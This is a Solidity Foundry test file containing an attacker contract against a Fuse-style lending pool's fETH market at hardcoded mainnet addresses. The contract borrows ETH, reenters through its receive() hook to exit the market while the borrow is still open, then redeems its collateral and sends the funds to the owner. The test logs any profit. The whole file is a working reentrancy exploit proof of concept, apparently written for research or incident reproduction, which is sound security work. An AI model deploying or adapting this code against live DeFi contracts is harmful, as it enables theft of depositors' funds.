// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function getCash() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function totalFuseFees() external view returns (uint256);
    function totalAdminFees() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
}

contract TinyBorrowAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;
    uint256 public exitCode;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack(uint256 borrowAmt) external payable {
        FETH72.mint{value: msg.value}();

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        borrowInFlight = true;
        uint256 result = FETH72.borrow(borrowAmt);
        borrowInFlight = false;
        console.log("Borrow result:", result);
        console.log("Reentered:", reentered);
        console.log("Exit code:", exitCode);

        if (reentered && exitCode == 0) {
            console.log("SUCCESS! Redeeming...");
            uint256 cTokens = FETH72.balanceOf(address(this));
            FETH72.redeem(cTokens);
        }

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;

        // Debug: check state during reentrancy
        uint256 cash = FETH72.getCash();
        uint256 tBorrows = FETH72.totalBorrows();
        uint256 tReserves = FETH72.totalReserves();
        uint256 tFuseFees = FETH72.totalFuseFees();
        uint256 tAdminFees = FETH72.totalAdminFees();
        uint256 tSupply = FETH72.totalSupply();

        console.log("=== During reentrancy ===");
        console.log("Cash:", cash);
        console.log("TotalBorrows:", tBorrows);
        console.log("TotalReserves:", tReserves);
        console.log("TotalSupply:", tSupply);

        uint256 numerator = cash + tBorrows - tReserves - tFuseFees - tAdminFees;
        console.log("Numerator:", numerator);
        console.log("ExchangeRate would be:", numerator * 1e18 / tSupply);

        // Now try exchangeRateStored
        uint256 er = FETH72.exchangeRateStored();
        console.log("exchangeRateStored:", er);

        // Try exitMarket
        exitCode = COMPTROLLER.exitMarket(address(FETH72));
        console.log("exitMarket result:", exitCode);
    }
}

contract Pool72Test3 is Test {
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    function testTinyBorrow() public {
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);

        vm.startPrank(attacker);
        TinyBorrowAttacker a = new TinyBorrowAttacker(attacker);

        // Try borrowing just 0.01 ETH with 10 ETH collateral
        uint256 balBefore = attacker.balance;
        a.attack{value: 10 ether}(0.01 ether);
        uint256 balAfter = attacker.balance;

        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }
        vm.stopPrank();
    }
}
